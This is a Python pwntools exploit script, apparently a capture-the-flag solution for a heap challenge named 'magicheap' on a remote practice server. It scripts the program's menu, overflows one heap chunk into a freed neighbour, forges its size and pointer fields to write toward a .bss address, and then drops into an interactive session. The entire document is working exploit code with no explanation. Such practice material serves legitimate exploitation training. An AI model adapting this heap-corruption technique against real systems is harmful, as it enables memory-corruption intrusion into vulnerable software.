from pwn import*
context.log_level = 'debug'

def create(size,cont):
	sh.sendlineafter('Your choice :','1')
	sh.sendlineafter('Size of Heap : ',str(size))
	sh.sendlineafter('Content of heap:',str(cont))

def delet(index):
	sh.sendlineafter('Your choice :','3')
	sh.sendlineafter('Index :',str(index))
	
def edit(index,size,cont):
	sh.sendlineafter('Your choice :','2')
	sh.sendlineafter('Index :',str(index))
	sh.sendlineafter('Size of Heap : ',str(size))
	sh.sendlineafter('Content of heap : ',str(cont))

#sh = process('./magicheap')
sh = remote('node3.buuoj.cn',26049)
create(0x20,'AAAAAAAA') #0
create(0x100,'BBBBBBBBB') #1
create(0x20,'CCCCCCCC') #2

delet(2)
delet(1)

bss_data = 0x06020A0 
payload = 'A'*0x20
payload += p64(0) #prev
payload += p64(0x111) #size
payload += 'fd'*4
payload += p64(bss_data-0x10)
	
edit(0,0x40,payload)
#gdb.attach(sh)
create(0x100,'create')

sh.interactive()
